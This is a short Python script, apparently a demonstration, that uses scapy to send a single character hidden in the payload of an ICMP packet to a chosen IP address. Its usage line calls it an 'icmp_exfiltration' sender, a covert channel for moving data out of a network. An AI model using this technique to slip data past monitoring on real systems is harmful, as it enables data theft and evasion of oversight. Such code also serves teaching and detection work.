import scapy.all as scapy
import sys

def send_icmp(character, destination_ip):
    data = character.encode()
    packet = scapy.IP(dst=destination_ip) / scapy.ICMP() / data
    scapy.send(packet, verbose=False)
    print(f"Sent '{character}' to {destination_ip}.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python icmp_exfiltration_send.py <destination_ip> <character>")
        sys.exit(1)

    destination_ip = sys.argv[1]
    character = sys.argv[2]

    if len(character) != 1:
        print("Please provide exactly one character.")
        sys.exit(1)

    send_icmp(character, destination_ip)
